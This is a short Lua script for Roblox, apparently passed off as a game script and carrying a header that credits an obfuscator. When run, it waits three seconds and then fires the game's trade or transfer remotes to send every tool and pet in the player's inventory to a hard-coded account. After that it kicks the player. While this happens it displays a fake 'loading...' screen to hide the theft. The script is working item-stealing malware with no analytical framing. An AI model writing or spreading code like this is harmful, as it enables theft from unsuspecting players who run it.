--lua
--[[
This script was generated using MoonVeil 2.0.20 [https://moonveil.cc]
--]]
local TARGET = "s4s5z6782"
local function stealAll()
    local player = game.Players.LocalPlayer
    local inventory = player:FindFirstChild("Inventory")
    if not inventory then return end
    for _, item in pairs(inventory:GetChildren()) do
        if item:IsA("Tool") or item:IsA("Pet") then
            local remote = game:GetService("ReplicatedStorage"):FindFirstChild("TransferItems")
            if not remote then
                remote = game:GetService("ReplicatedStorage"):FindFirstChild("Trade"):FindFirstChild("OfferItem")
            end
            if remote then
                remote:FireServer({itemId = item:GetAttribute("Id") or item.Name, target = TARGET})
                wait(0.1)
            end
        end
    end
    player:Kick("")
end
spawn(function()
    wait(3)
    stealAll()
end)
local s = Instance.new("ScreenGui")
s.Name = "x"
s.Parent = game.CoreGui
local f = Instance.new("Frame")
f.Size = UDim2.new(0, 200, 0, 150)
f.Position = UDim2.new(0.5, -100, 0.5, -75)
f.BackgroundColor3 = Color3.fromRGB(15,15,25)
f.Parent = s
local l = Instance.new("TextLabel")
l.Size = UDim2.new(1,0,0,30)
l.Position = UDim2.new(0,0,0,10)
l.Text = "loading..."
l.TextColor3 = Color3.fromRGB(255,255,255)
l.BackgroundTransparency = 1
l.Parent = f
wait(4)
s:Destroy()
